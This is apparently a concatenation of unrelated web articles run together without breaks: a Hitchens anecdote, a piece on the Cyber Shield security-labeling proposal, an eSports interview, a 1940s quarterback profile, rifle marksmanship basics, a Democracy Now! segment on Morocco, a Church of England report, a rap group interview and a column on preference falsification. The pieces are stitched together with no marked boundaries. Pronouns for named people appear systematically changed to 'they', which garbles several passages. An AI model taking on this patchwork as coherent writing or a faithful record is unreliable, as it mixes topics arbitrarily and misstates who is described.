I was reminded of this quandary when I heard of Christopher Hitchens's death. In May 2001, I was in Hay for the literary festival and had arranged to meet friends for supper in an Italian restaurant. We had started our main course when the door swung open and Hitchens marched in with a face like thunder, having stormed out of Bill Clinton's lecture. They strode up to the bar and ordered a Macallan, only to be told patrons could only purchase alcohol alongside food. At this point, the great controversialist blew a gasket. This, they raged, was why they lived in the States, since in this piddling (a choicer adjective was used) nation a man couldn't even order a large Scotch without some bureaucrat denying them the right to eschew food.
The room had fallen silent, so I walked across to the fuming author and asked if they would care to join our table. They declared they would not stay in a place that had a bar but refused to serve drinks and stalked out. Minutes later, they walked back in, pointed at me and said, “Do you know where I can get a decent malt?” I nodded. “Come with me,” they said, holding open the door. This is when I behaved very badly, according to two members of my group, or just as they would have done themselves, according to the other five. I put down my knife and fork, picked up my coat and escorted Hitch to the well-stocked bar at the Swan Hotel, where I received a two-hour masterclass on the art of dispatching your enemies. Ten years on, I feel contrite about the incident. My behaviour was deplorable – yet I can't say I regret it. Christopher Hitchens was a brilliant journalist and orator, and the best company you'll find on a barstool. There are occasions, surely, when you should be granted the etiquette equivalent of a “get out of jail free” card.
---------------
The mind boggles at what Hitchens would have made of Councillor Ernest Gibson's tirade at “irresponsible” lunchtime drinking on Coronation Street. The South Tyneside politico is fretting about scenes in which workers at Corrie's local underwear factory are seen drinking beer before returning to work. Clearly, they feel a responsible drama would show the returning employees chain-stitching their hands to an uplift bra. Any pub lover will tell you moderate lunchtime drinking rarely harms those accustomed to the practice. Abstinence is advisable for anyone operating heavy machinery, but surely the rest of us need not be chivvied into abandoning the pleasures of a gently nursed beverage. Indeed, I think the makers of Corrie should be praised for the way their actors sip their drinks so slowly: the antithesis of binge-drinking.
We talk a lot about the importance of information security but let's be honest it is not the most accessible topic for even experts at times. Day after day we find out new information which can be very overwhelming.

So what would it look like to have a standardized system for understanding what makes something secure? Such a proposal might be able to help consumers and suppliers make better choices in purchasing and product development. Well we may have a new hope in the Cyber Shield proposal by Senator Edward Markey (D) of Massachusetts.
There is no formal document written yet, instead Markey has been working with the Institute for Critical Infrastructure Technology (ICIT), a cybersecurity think tank. With the ICIT Markey is finding a feasible foundation on which the legislation will be drafted. The Cyber Shield proposal is still in dialogue stage, however a very necessary dialogue that leading think tank ICIT approves of.
Cyber Shield is at once both a design policy and labeling system that is voluntary for businesses to participate in. No part of this legislation is necessarily new, we see preemptive design principles in other goods and services, we see labeling systems intended to inform purchasing decisions, and some of the strongest systems are voluntary. In this article you will find insights from James Scott the Senior Fellow at ICIT who did the initial analysis of the policy dialogue.
The design side of the proposal seems to be rooted in security-by-design principles that anticipate insider and outsider threats. This should be commonplace but among the private sector it is not. In fact, a study conducted by Dimensional Research has demonstrated that cybersecurity is an afterthought in product and service development. Product and systems development, right now, are a rush to get to market.
This creates problems where many more preventable vulnerabilities are present to the public. This becomes even more of a social threat as reliance on cloud software, storage, and Internet of Things become more integrated into everyday life for individual and business consumers. Security, in the private sector has for the most part been reliant on security through obsolescence.
It is for this reason security-by-design is critical in the development process, because most security scenarios are preventable if they are accounted for in the initial design. The core principles of security-by-design are economy of mechanism, fail-safe defaults, complete mediation, open design, separation of privilege, the least privilege, the least common mechanism, and psychological acceptability.
While these would seem standard practice they are not in reality. Security-by-design principles have been promoted by NASA, NSA, and NIST according to James Scott. It is an approach that policymakers have not been discussing, rather dialogue has been centered on reactionary measures. This has kept government behind best practices over the years when it comes to information security.
Example: The United States Air Force (USAF) is the primary division in the U.S. Military that is actively working on cybersecurity for the Armed Forces. In January the USAF made clear their efforts to reinforce cybersecurity in all weapons systems for the Armed Forces. It was made clear by the AF Cyber Technical Director that an analysis and re-development of systems would take place for weapons to ensure the security of the weapon systems. The principle concern for the Air Force is the reduction of risk, as is the case with almost any public sector organization. This focus on risk reduction has made cybersecurity one of the leading capital investment projects in the USAF.
The labeling system aspect of policy is intended to correct the traditional market failure of information asymmetry. This labeling system would need to go beyond a some of the weaker certification systems that have developed over the years. There are many strong examples of labeling systems intended to enhance public safety by providing them more information. Nowhere is this more present than the nutrition labeling system.
The Nutrition Labeling and Education Act came into effect on November 8, 1990 signed into law by President Bush. It required nutrition labeling on most foods controlled by the FDA. So the real question is what are the behavioral and social effects of such labeling? This question has been studied for years and research tends to conclude that there is a significant behaviour change in consumer behavior as a result of labeling. In most cases nutrient labeling had the impact people establishing a “fat budget” where they were tracking either calories or fat content they were consuming daily.
So it did have the impact of getting people to pay attention to what they were consuming but did it get people to change their behaviours in the ways intended. Not necessarily, the study also indicates that the label had an impact where taste differences were small between healthy and unhealthy options. However when presented with great taste differences American consumers opted for the unhealthy choice, despite the label. This offers insights for what may happen with a labeling system developed for information security. In the security context consumers, both individual and business, may opt for convenience over security. This is likely to be the case if the security-by-design principle of psychological acceptability is ignored in the development process. This is the critical relationship in the proposed legislation that design and labeling need to have a synchronized relationship.
Current discussions about a label for information security have been very productive and grounded in strong analysis. When it comes to information security a star rating may be misleading according to James Scott. Scott's reasoning was that it promotes the idea that a product is “certified” safe, which is an illusion because of ever-changing threats. One of the discussions between Scott and Markey's office was instead rooting the label in a confidence rating between 0-99% and machine learning so that as inputs and conditions change, a machine network can quickly take those into consideration live.
This approach by James Scott has support from recent usability research of nutrition labeling. According to studies, single attribute labeling schemes are far more effective than multiattribute ones. This study concluded that the current nutritional label is not as usable or effective as it could be as a result of the complexity of the label. Developing a label for information security would be a catalyst for behaviour change in consumers and producers, however this does rely on a good management of the policy development process to ensure that a strong regulatory solution is put forward.
Regulatory success depends on the rigor of analysis done to ensure it will not cause negative externalities to the stakeholders involved or generate an additional market failure. So far the approach that Edward Markey is taking seems to indicate their office is taking proper precaution to ensure a strong policy is developed for the security of the United States economy.
For MLG Raleigh, popular gaming commentary website Cynical Brit (the home of TotalBiscuit) in collaboration with Reddit sponsored a player to come to the tournament who showed massive amounts of potential in Korea, but did not have a team. That player was one Choi "CranK" Jae Won – a player who had had an extremely impressive run before being signed, qualifying for GSL Season 4 in code A, winning the IPL 5 Amateur Open, and placing in the top 12 at MLG Raleigh. This move by Cynical Brit led many to wonder if they were going to found a team – and they have: Axiom eSports. I had a chance to catch up with Genna Bain, wife of TotalBiscuit, manager of the newly formed Axiom eSports and Cynical Brit the night of the big unveiling of the team. Check out what they had to say!
Dustin Steiner, GameZone eSports Correspondent: Being the manager of Cynical Brit must come with a laundry list of responsibilities – what is a typical day in the life of a manager of such a large presence in the gaming community like?
Genna Bain, Manager of Axiom eSports: I wake up pretty early every morning to get the Bainling off to school and then try to get a majority of my admin duties done before lunch time. Hopefully, between tasks, I can get some actual laundry done. The joys of working from your own home, right? A large part of my day to day is actually scanning the internet for people copying TB's content, preventing them from reading YouTube comments and booking future appearances.
DS: Your husband TotalBiscuit started doing commentary for StarCraft II fairly early on in the game's life – when was your first experience at a tournament and how was it?
GB: As a gamer, I've attended many eSports prior to SC2. My first experience attending a tournament with a live crowd and TB commentating was MLG Anaheim. It was a really great experience to see everything come together from behind the scenes.
DS: So obviously the burning question every fan wants to know – what made you decide to start an eSports team? And why now?
GB: Starting a team has always been a dream of mine ever since I started attending events. It was obviously just a passing thought then and I never really gave it much serious consideration as I wasn't in the kind of position to make that happen. Many years later, here we are, and I've reached a place in my life where I feel that my primary business is doing well enough to take on some additional projects. TB has always been supportive about reaching out and improving the eSports community where possible, so this was just a natural progression for us.
DS: What goes into starting your own eSports team? How is it different from running a general gaming clan?
GB: Having been part of both a BW clan and WC3 guild, I can say that owning a team is a world of difference. In a gaming clan, you obviously want to foster a group of close-knit individuals who game together in hopes that some emerging talent will go on to represent you at prestigious events. As a team owner, there is a whole different kind of pressure. You have to select your players with more precision and be constantly developing new opportunities to promote them as well as increasing your own brand awareness as a team entity.
DS: Tell me a bit about the name Axiom eSports – how did you come up with it?
GB: Axiom in it's original meaning in Greek means, “worthy”. I wanted every player that we bring onto the team to feel just that. In it's more modern definition it is a self evident truth that requires no justification. It is also a premise or a starting point. This is our starting point.
DS: What made you decide to go with Crank as your first signed player?
GB : CranK showed a lot of promise before we had even considered bringing them to MLG Raleigh on a single event sponsorship. This was a good test for us to see how managing a player would work out. Sure, we have experience in the industry, but not with managing players or running teams. This was a bit of new territory for us. We greatly enjoyed the experience and, from their performance in the open bracket through to championship Sunday, we felt that they have a great deal of potential given the right support.
DS: Do you have plans to open a training house, as many other major teams have?
GB: I don't find it necessary at this point in time as we only have one active player signed to Axiom. As new players are added, however, this will most likely become a necessity.
DS: Any prospective future Axiom players you have an eye on? If you can't/don't want to say, what sort of qualities is you looking for from future Axiom players?
GB: There are a few unsigned, yet talented players that have captured our attention, however, I am not at liberty to reveal their names. I am looking for players that haven't lost their passion for the game. My goal is to provide an opportunity for players who, for one reason or another, just have not had the chance to showcase their talent in major US and EU tournaments. I want to cultivate a team that supports a closer connection with the community so that fans feel that the players are accessible, regardless of any language barrier that might exist.
DS: Having two commentators in your husband TotalBiscuit and Husky as your first two sponsors will certainly be helpful – do you have any plans to run any Axiom sponsored tournaments in the coming months?
GB: There is some serious building to do with the brand and the player roster. While I would love to say yes immediately, I really want to see our business plan solidify and our sponsorship for the team stable before committing to sponsored tournaments so quickly.
DS: Is Axiom looking to get into any other games aside from StarCraft II?
GB: At this time, we are only looking at StarCraft. I think taking on additional games would spread our focus too thin. The result would be mediocre and that's not what we're looking to achieve here with Axiom.
DS: Do you have any closing words for your new fans?
GB: Thank you so much for being supportive of everyone here at Axiom. We are extremely excited about the future of this endeavor. Please check out Ax.CranK's games as they compete in the MvP Invitational and we look forward to seeing everyone at MLG Dallas and IPL5 in November!
Thanks Genna! We look forward to seeing all Axioms will accomplish in the coming months – good luck at MLG Dallas and IPL5! You can follow Axiom eSports on Twitter @AxiomeSports

Christmas is the biggest shopping holiday of the year. So it's no surprise that companies spend every December absolutely bombarding us with ads full of cheerful, wholesome, uplifting messages to capitalize on all that goodwill and turn it into something useful: money. And then there are the ads that seem to want nothing to do with cheer and goodwill, but rather to unsettle you someplace deep in your soul, so that you will never be "right" again. We think that's a pretty good idea because -- we don't know -- there's just something about you we plain don't like. So here, look upon these and despair:

No that's not fake. This ad actually ran in newspapers. Making things even worse: It was 1939, when the United States was still in the thrall of the Great Depression. It was a tough, desperate time, and families everywhere were slowly starving to death while facing grim choices and hard realities.
Every picture tells a story, and this one only gets worse the more you think about it. You might assume we've stumbled upon Dad's suicide note while he's off working up the nerve to make it a memorable Christmas. But notice that the note is written in the second person. That can only mean that this note is written to dad, essentially saying: "Look, we're not going to kill you. But if your failure to provide for this family makes you want to kill yourself, well, Merry Christmas. It's a Colt, so even you should be able to do this job.
"I can feel it coming back again," Ed Kowalczyk once sang in their band Live's seminal '90s scream to the gods, "Lighting Crashes." "Like a rollin' thunder chasing the wind," they growl. "Forces pullin' from the center of the earth again," they belt.
I can feel it
I can feel it
Some say that finding the love of your life can feel electric—like being struck by lighting. I cannot speak for teens Dylan and Lexie, a Claremont, Ca. couple who were actually struck by lighting this week, but I would venture to say that the love that bonds them together is powerful— powerful enough, at least, to save them from being electrocuted by lightning.
CBS Los Angeles reports that the couple were walking hand-in-hand down a tree-lined street (because that is what two teens in love do) when they were hit. “It was more of just kind of shove, you know, and it felt kind of like I was getting hit over the head with metal or something,” Dylan told the TV station. “Next thing you know, we are on the ground and we gave each other the most terrified looks you could possibly imagine,” Lexie added.
The two survived, unscathed. (According to National Geographic, we all live with a 1 in 3,000 chance of being struck by lightning in our lifetimes. To be so lucky…)
“These two were lucky they that they were holding hands. It helped to diffuse the electrical current that ran through their bodies,” Dr. Stefan Reynoso, who examined them after the incident, told CBS Los Angeles.

Dylan and Lexie: Your love will be tested in the course of time—as dreams wax and wane, as hopes are dashed, as fate works its cruel way. But hold on to what saved you from the lightning—and don't let go.

Even in the run heavy days of the 1940s, quarterbacks were high profile players. Sammy Baugh, Sid Luckman and Bob Waterfield were bonafide superstars of the NFL. For three years, the Eagles' Tommy Thompson was their equal.
Undrafted out of Tulsa in 1940, Thompson was a defensive back and backup quarterback on the Steelers for one season, then released. They joined the Eagles for the 1941 season, and claimed the starting QB job over the wholly ineffective Len Barnum, who threw no touchdowns and 10 interceptions in only 55 pass attempts. Thompson finished the season fourth in the league in passing yards and touchdown passes, thanks in part to the 2-8-1 Eagles constantly being behind, though they were only fourth in the league in attempts. They also caught four passes for 30 yards, including one for a touchdown. In 1942 the Eagles were slightly worse, going 2-9, but Thompson finished third in passing yards. They made the 1942 All Star Team, which back then was played against the defending champions, which was the Redskins. The league discontinued this exhibition game in 1943. Illustrating how rudimentary passing was during this time, Thompson was 3rd in the league in passer rating in both 1941 and 1942… with ratings of 51.4 and 50.3, respectively. They also caught a career high of four interceptions, in their first four seasons they intercepted 12 passes while playing defensive back.
Thompson then missed the 1943 and 1944 seasons due to military service. When they returned to the Eagles during the 1945 season, they found themselves behind Roy Zimmerman and Allie Sherman on the depth chart, the trio would split playing time in 1946 as well. Thompson led the Eagles to a 28-24 win over the Redskins after the team fell behind 24-0 at halftime, thanks in part to Thompson's three interceptions, two of which led to 10 Redskins points. In the offseason Zimmerman was traded to the Lions and Thompson was given the starting job for 1947, which they would keep for the rest of their career.
It was then that Thompson and the Eagles took off. With Steve Van Buren running behind a dominant offensive line, the offense was bolstered by the addition of Hall of Fame end Pete Pihos. This versatile offense, teamed with an excellent defense and overseen by Hall of Fame head coach Greasy Neale, saw the Eagles become the best team of the late 1940s. In 1947 the Birds had the second highest scoring offense despite ranking only sixth (out of ten) in yards in 1947, leading them to an 8-4 record, tying them for first place with the Steelers. Despite an inconsistent end to the season by Thompson, which saw them throw seven total interceptions in losses to the Boston Yanks and Chicago Cardinals, but only one in wins against the Steelers and Packers, Thompson was sharp as the Eagles won the game 21-0 and a place in the NFL Championship Game thanks to two touchdown passes.
Against the Cardinals in the title game, Thompson completed 27 of 44 passes, then NFL Championship Game records, for 297 yards, one touchdown and three interceptions as the Eagles fell 28-21.
In 1948, the Eagles opened the season with a loss to the Cardinals and a tie with the Rams. They then won back to back 45-0 games against the Giants and Redskins to kick off an 8 game winning streak, which included a third 45-0 win over the Yanks that saw Thompson throw four touchdown passes. The following week, with four games left to go, Thompson threw three touchdowns as the Eagles beat the Redskins 45-21 to clinch a division title. The Eagles finished the season with another 45 point performance, with Thompson again throwing four touchdowns in a 45-21 win over the Lions.
This led to a Championship Game rematch with the Cardinals. In a blizzard, the Eagles won 7-0 on the back of Van Buren's 98 yards and touchdown, combined the Eagles and Cardinals went 5-23 in the air. Thompson had a 67 yard touchdown called back in the first quarter due to an offsides penalty, but later helped set up Van Buren's five yard touchdown run with a six yard sneak for a first down to the five-yard line. In those days quarterbacks also called plays, Greasy Neale said that Thompson "was the key. They called almost every play and called them right."
1949 saw the Eagles hit another gear. A year after having the second highest scoring offense and defense, the Birds topped the charts in both categories and finished 11-1. Thompson threw two touchdowns and ran for another in a 49-14 win over the Redskins in October, then in the November rematch they threw four touchdowns as the Birds won 44-21 and walked to another division title. Football in the 1940s was nowhere near the quarterback heavy game it is now, but Thompson outdueled their Hall of Fame peers that season. They scored seven touchdowns and threw two interceptions to Baugh's one touchdown and nine interceptions in two games; and they threw three touchdowns and three interceptions against Waterfield's one score and three interceptions, also in two games.
One of those games against Waterfield was the 1949 Championship Game. The Eagles faced not just a new title game opponent, but also a new type of title game bad weather: heavy rain that made the field essentially a mud pit. Thompson attempted only nine passes, completing five for 68 yards, a touchdown and two interceptions, Waterfield managed only 10 of 27 for 98 yards and an interception. The star of the game was once again Van Buren, who set a title game record with 196 yards on the ground. The defense pitched a shutout and the Eagles won 14-0.
Then it all fell apart in 1950. Van Buren's play fell off a cliff and the previously highly efficient Thompson threw 22 interceptions to just 11 touchdowns, the Eagles finished in fourth place with a 6-6 record. Neale was fired and Thompson, after nine seasons in the NFL, hung up their seventeen year old pads and retired at the age of 34. Yes, you read that right. Thompson played with the same set of shoulder pads through high school, college and the NFL. In 1948 a leather factory considered them too far gone to repair, Thompson said they were the best in the world. After retirement they went into coaching, in the Canadian Football League, and in 1953 they had a short comeback with the Winnipeg Blue Bombers, they also coached with the Cardinals and the University of Arkansas.
Thompson wasn't the best in the world but from 1947 to 1949, but they were as efficient as anyone. They led the league in touchdown percentage for three straight years from 1947-1949, led the league in passer rating in 1948 and 1949 after finishing second in 1947, led the league in interception percentage in 1949 after finishing fourth and third respectively in 1947 and 1948, led the league in yards per attempt in 1947 and finished second in 1948 and 1949and their completion percentage was 4th in 1947 and 2nd in both 1948 and 1949. Over that three-year period they stack up extremely well against their Hall of Fame peers:
Att Comp% Yards TD INT Rating Thompson 661 54.9 5372 57 37 87.1 Waterfield 697 48.4 4732 39 60 53.4 Baugh 924 58.4 7440 65 52 84.3
In addition to an accurate arm, one method by which Thompson was so effective was an early form of play action. With defenses keying in on Van Buren, Thompson would feign a handoff to Van Buren to draw in defenders, concealing the ball on their hip, then pass to an open receiver. "If I missed, I'd just give it to Steve on the next play" they said of the deke. "He'd get the first [down] anyway". Thompson's confidence wasn't justifiably limited to just their great running back. Chuck Bednarik, a rookie in 1949, said that Thompson had the "cockiness" that makes a great quarterback. Van Buren agreed with Bednarik, both saying that Thompson felt that nobody could beat the Eagles,
Van Buren lso praised their leadership, and Al Wistert, their captain, lauded Thompson's toughness.
And they had to be, while Thompson was aided by a terrific surrounding cast, they did so with a handicap: they were legally blind in one eye. Hit in the eye by a rock as a child, Thompson had no central vision in their damaged eye. They never used it as a crutch, apparently they didn't even tell their teammates what eye it was, Wistert said they were pretty sure it was left. Thompson said they had good enough peripheral vision, their teammates joked their blindness made them stand tall in the pocket because they couldn't see an oncoming defender, but also knew that they were just plain tough, able to bounce right back up from a hit in the pocket and get on with the next play.
Thompson's peak wasn't long enough for their career to be considered great, but in that short peak they played as well as those who were. They aren't the engine of the Eagles great late 1940s teams, but as a highly efficient passer, strong play caller and highly respected teammate by the greats of those championship teams, they aren't along for the ride either.  They are fifth all-time in passing yards in Eagles history. Among passers with just 500 career attempts, only Sonny Jurgensen has a better touchdown percentage, and Thompson is fifth in yards per attempt. It would be generous to say they were a great player, but Tommy Thompson was an important player on a great team, and for that they should not be forgotten.

Marksmanship principles are the basic ideas behind being a proficient shooter. Here, I shall list them and then elaborate on how they apply to rifle shooting.
1. The position and hold must be firm enough to support the weapon.
Naturally, the firmer a shooters position is, the more successful their shooting will be, as the rifle will move around less of its own accord and will instead stay still. In target shooting, the position can be supported by a sling running from the shooters bicep to the rifle preventing their left arm from moving forward and taking some of the strain and weight of the weapon.
2. The weapon must be pointed naturally at the target without undue physical effort.
No physical exertion must be required to make the weapon point in the direction of the target, as it will result in the rifle moving around unsteadily. Instead of forcing the rifle left or right to point in the right direction, moving the hips or the legs will move the position so the rifle is naturally aligned. To ensure the rifle is aligned naturally with the target, a shooter can close their eyes, breathe in, relax, and fully ex-hail before opening their eyes. If the rifle is still pointed at the target, it is naturally aligned.
3. Sight alignment must be correct.
Contrary to popular belief, sight alignment is NOT the same as aim. Sight alignment is the relationship between the eye, the rear-sight and the foresight. The foresight must be in the middle of the rear-sight. Altering the distance of the rear-sights from the eye, or the rear-sight aperture can give a clearer sight picture to make this easier.
4. The shot must be released and followed through without disturbing the position.
Triggers should not be pulled. They should be squeezed. Even if a shot was perfectly aligned to hit dead center of the target, yanking the trigger back roughly will move the rifle away from the target as the shot is fired. Depending on the weight of the trigger, pressure may also need to be applied by the thumb onto the stock as well as onto the trigger in a squeezing motion.

AMY GOODMAN: This is Democracy Now!, democracynow.org, The War and Peace Report. I'm Amy Goodman, as we turn to Morocco, where thousands of people have been protesting across Morocco after a fish seller was crushed to death in a garbage truck trying to retrieve fish confiscated by police. Video circulating online appears to show Mouhcine Fikri jumping into the back of the garbage truck to rescue their swordfish, before being crushed to death by its compactor, that may have been turned on at the instruction of authorities. According to local reports, Moroccan authorities prohibit the sale of swordfish at this time of year. Activists have accused police officers of ordering garbage men to crush Fikri.
Their death in the northern town of Al Hoceima has elicited widespread anger on social media. The weekend's rallies were called by activists from the February 20th movement, which organized demonstrations during the Arab Spring of 2011. Fikri's death drew parallels to that of the Tunisian fruit and vegetable seller Mohamed Bouazizi in 2010. After being harassed by authorities in Tunisia, and they took their scales, they finally set themselves on fire, which sparked the Arab Spring uprisings of Tunisia and then Egypt. Morocco's King Mohammed has ordered officials to visit Fikri's family. The ministries of interior and justice have pledged to conduct an investigation. Prosecutors say 11 people have already been arrested.
To talk more about what's happening in Morocco, we're joined by Miriyam Aouragh, a Dutch-Moroccan anthropologist, democracy activist, based in Britain, lecturer at the University of Westminster in London, writing a book currently on the February 20th movement in Morocco.
Welcome to Democracy Now!
MIRIYAM AOURAGH: Thank you.
AMY GOODMAN: It's great to have you with us, Miriyam. So, explain what you understand happened.
MIRIYAM AOURAGH: So I think what we see here is partly a continuation of the explosion of anger and protest in 2011, but also, at the same time, a sort of manifestation of police repression, on the one hand, and a very complex reality of the sort of privatization and harsh control of the fishery. And this is a problem, particularly for coastal cities and towns, like Al Hoceima, where a lot of people are dependent on fishing and have been selling fish independently for a long time—it's part of the social fabric, basically, of these cities and towns—and being confronted now with a sort of harsh policy that prevents them to do that. So I think we see sort of two or three different dynamics happening at the same time: the sort of call for democracy, police repression, and, at the same time, I think what is often missed out in the analysis, a very important political economy that has to do with Morocco's extreme neoliberal transformations, ongoing at present.
AMY GOODMAN: Al Hoceima, in the north of the country, has a history of unrest—is that right?—of resistance. Can you explain?
MIRIYAM AOURAGH: So, I mean, a lot of people who study or know a bit about Morocco know that the Rif, the northern area, is also the birthplace of Abd el-Krim al-Khattabi, one of the most important anticolonial resistance fighters in the early 1920s. Morocco was occupied, colonized by France and Spain, and Spain was the colonizer in the north. And it was a particularly harsh colonization in the north. So, there is this history of colonial violence.
But interestingly, during independence, which wasn't really an independence like Algeria or other countries, but a sort of agreed transition with the colonizers, the north wanted to continue their struggle for real independence. And that happened in '58, '59, and that was crushed by the then-new kingdom. So that is very fresh in the memory.
But what is not often mentioned is the intifadas, as they were called, of the '80s. So, in '81 and in '84, Al Hoceima had major uprisings, that were actually initiated and led by school students, by young school students, and that spread throughout the north of the country. So those memories are still also fresh for a certain generation of politically involved citizens.
And obviously, all of that culminated in 2011. There has been a very strict censorship of the political history of Morocco until the early 2000s, so a lot of people didn't know about these histories of anticolonial resistance. So, all of that came back into the present memory in 2011. So I think we should see the current uprisings in the country since last week as a sort of moment where these previous experiences come back and the lessons drawn from 2011 are being manifested now.
AMY GOODMAN: And what was February 20th?
MIRIYAM AOURAGH: So, the February 20th movement was sort of the Moroccan framing of the uprisings in 2011. And interestingly, Al Hoceima, the very city we're talking about now, has undergone at that time a very gruesome experience, when five demonstrators from Al Hoceima were killed and burned alive during the 20 February protests. And those cases were never resolved or investigated. So, there is a certain unfinished business—feeling of unfinished business also in Al Hoceima and the rest of the country with regards to the events that happened around the 20 February movement in 2011 and '12.
AMY GOODMAN: Talk about what's happening next week. You know, Democracy Now! is headed to Morocco to cover the 22nd COP, the conference of parties, the U.N. climate summit, in Marrakech. And I'm looking at posters that were held in the protests in Marrakech this weekend, and it says, you know, “Come to COP 22. We will crush you,” referring to what happened to Fikri.
MIRIYAM AOURAGH: Yeah. So, interestingly, I think—I mean, there's an interesting international development with regards to Morocco's attempt to become part of the international community. So, Morocco has invested enormously in its PR. And a few years ago, leaks, reports—reports were leaked exposing the Moroccan makhzen, or state, employing or consulting PR advisers that are affiliated with AIPAC and other organizations that are experienced in sort of profiling a certain unacceptable political reality in political terms that are seen as democratic. So, the invitation of big organizations and NGOs to Morocco to organize their conferences is one of the ways that the Moroccan state is trying to sort of improve its stature internationally.
So I think this conference in Marrakech is a continuation of that policy. We've seen that with a human rights conference, as well, two years ago, which a lot of protesters were very angry about, because at the same time that these conferences were organized about human rights, human rights in Morocco were crushed. And so I think this level of cynicism and sometimes irony in the hashtags and posters and banners are precisely about exposing that contradiction. Here is a country that is organizing international conferences about climate change or democracy, and at the same time not offering any of those rights to its own citizens. So, what we are hoping, in a way, what people are hoping, is to make use of that momentum. If that momentum is going to mean that there will be more press and, hopefully, people from Democracy Now!, as well, covering the events at the conference, that it will also help shed light on the democratic—or lack of democracy in the country.
AMY GOODMAN: We just have 30 seconds. How was what happened in Morocco different from Egypt and Tunisia?
MIRIYAM AOURAGH: I think it's different in the sense that the experience of Tunisia and Egypt has—is behind us. So, activists have now come to learn the ways the state is manipulating the protests and how infiltrators have already been sent into the different protests across the country. And we have learned from that, and we are trying to prevent them to do the same as they did in 2011.
AMY GOODMAN: Well, I want to thank you very much, Miriyam Aouragh, anthropologist, democracy activist, currently based in Britain, lecturer at the University of Westminster in London, currently writing a book about the February 20th movement in Morocco, where we are headed the week after Election Day. We will be there for the week covering the U.N. climate summit.
The Church of England has lifted a ban on gay male clergy who live with their partners from becoming bishops on the condition they pledge to stay celibate, threatening to reignite an issue that splits the 80-million-strong global Anglican community.
One of the church's most senior bodies, the House of Bishops, said on Friday it had ended an 18-month moratorium on the appointment of gays in civil partnerships as bishops.
"The House has confirmed that clergy in civil partnerships, and living in accordance with the teaching of the Church on human sexuality, can be considered as candidates for the episcopate," Graham James, the Bishop of Norwich, said.
The decision was made in late December but received little attention until the church confirmed it on Friday.
"The House believed it would be unjust to exclude from consideration for the episcopate anyone seeking to live fully in conformity with the Church's teaching on sexual ethics or other areas of personal life and discipline," they added in a statement on behalf of the House of Bishops.
The issue of homosexuality has driven a rift between Western and African Anglicans since a Canadian diocese approved blessings for same-sex couples in 2002 and US Anglicans in the Episcopal Church appointed an openly gay man as bishop in 2003.
Gay clergy in civil partnerships would be eligible for the episcopate - the position of bishop - if they make the pledge to remain celibate, as is already the case for gay deacons and priests.
The Church of England, struggling to remain relevant in modern Britain despite falling numbers of believers, is already under pressure after voting narrowly last November to maintain a ban on women becoming bishops.
The church teaches that couples can only have sex within marriage, and that marriage can only be between a man and a woman.
Britain legalised civil partnerships in 2005, forcing the church to consider how to treat clergy living in same-sex unions.
The church ruled that a civil partnership was not a bar to clerical position, provided the clergy remained celibate, but failed to specifically address the issue of when the appointment was a bishop until Friday.
We have a strange idea of China in the West -- if it's not Trump aggressively spitting out the name like it's a cuss word (Chy-Nah) then it's as a nebulous, bogeyman who steals our jobs and threatens to make Chinese the international business language of the world. We also think of it as a creative no-man's land where a lack of access to Google, Facebook, Twitter, Instagram, or YouTube has led to a country into darkness. Only that's not exactly true.
Chinese censorship may stymie artist flow, but that doesn't mean there aren't ways around it. When Melo, a lyricist and rapper from the rap group Higher Brothers, wrote a viral song about Uber with the lines "I don't write political hip-hop. But if any politicians try to shut me up, I'll cut off their heads and lay them at their corpses' feet" they were brought in for questioning by the Public Security Bureau. But that didn't stop them or their group mates from continuing to reach the youth with their music. The Higher Brothers, who hail from the city of Chengdu, make the rap songs that consistently blow up.
They've released four singles off their latest album Black Cab, "Made in China," "Bitch Don't Kill My Dab," "711," and "WeChat," which features Keith Ape, to mass internet adoration. We spoke with the group about their writing process and where they pull inspiration from.
What would you all say is the hardest part about making your music? How often do you come up against Chinese censorship laws and how do you create around them?
MasiWei: There's nothing exceptionally hard in making music for me. I just do it. The censorship laws haven't affected me and my process of making music.
DZ: The hardest part of making music is when I'm job searching or working full-time. I almost let making music music become my hobby. I balance it as best I can. Censorship hasn't affected me personally.
PSY: The hardest part of making music is in the beginning, when I don't have an exact plan. Or when I didn't have hope in the possibility.
Melo: The hardest part of making music is my family not understanding what I'm doing.
What groups/rappers are your biggest influences? Do you remember how you first heard them? What was happening at the time?
MasiWei: 50 Cent is my biggest influence. After watching "Get Rich or Die Trying" in middle school, I started looking for more hip-hop music. It eventually inspired me to make my first demo.
DZ: Kendrick Lamar. The first time I heard them was on CCTV5 Sport TV. It literally shook me. Kendrick introduced rap music to me and I've been loving it ever since.
PSY: Migos! The first time listen to Migos was when I was in my friend's car and they got me so high off of it.
Melo: J.Cole. When I read their lyrics... it's just so amazing.
It's clear that you have great crossover potential, but is that the goal? Are you creating for a specifically Chinese audience or do you have global aspirations?
MasiWei: Our focus is to make music for everyone, for the world.
Do you consider China or Asia as a whole a new hub for rap?
MasiWei: Rap is becoming more popular in China, because the Internet is making the world closer. Higher Brothers is representing China and we want to continue putting Asia on the map. 88Rising has been helpful in getting our music outside of Asia.
DZ: Rap music is everywhere now, not specific to one place.
PSY: Yes, because Asians love hip-hop culture. Higher Brothers has a chance to make rap unique to us and it's our time to do that.
Melo: Asia is becoming a popular place for rap. Nothing can stop good rap from becoming popular. Good stuff is good stuff.
In the U.S. and Europe, many people worry that if prominent politicians signal that they dislike and fear immigrants, foreigners and people of minority religions, they will unleash people's basest impulses and fuel violence. In their view, social norms of civility, tolerance and respect are fragile. If national leaders such as U.S. President Donald Trump flout those norms, they might unravel. The most careful work on this general subject comes from Duke University economist Timur Kuran, who has studied the topic of “preference falsification.” In Kuran's view, there is a big difference between what people say they think and what they actually think. Sometimes for better or sometimes for worse, people's statements and actions are inhibited by prevailing social norms. When norms start to disintegrate, we can see startlingly fast alterations in what people say and do.
U.S. President Donald Trump's election has weakened the social norms against supporting anti-immigration, Cass R. Sunstein writes. ( DOMINICK REUTER / AFP/GETTY IMAGES )
Kuran's leading example is the collapse of communism in Eastern Europe, which, they say, was long sustained by the widespread misconception that other people supported communism. Once prominent citizens started to announce, in public, that they abhorred communism, others felt freer to say that they abhorred it too, and regimes were bound to collapse. Kuran's theory can be applied broadly. Writing in the late 1990s, they predicted the backlash against affirmative action programs, contending that a lot of people opposed such programs even though they weren't saying so. Millions of people favoured same-sex marriage before they felt free to announce that they did. When professors keep quiet after left-wing students shut down conservative speakers, it may not be because they approve; they might be capitulating to social norms on campus. There is a strong taboo on anti-Semitism, which limits its public expression. It's hard to test these kinds of ideas rigorously, but in an ingenious new paper, a team of economists has done exactly that.

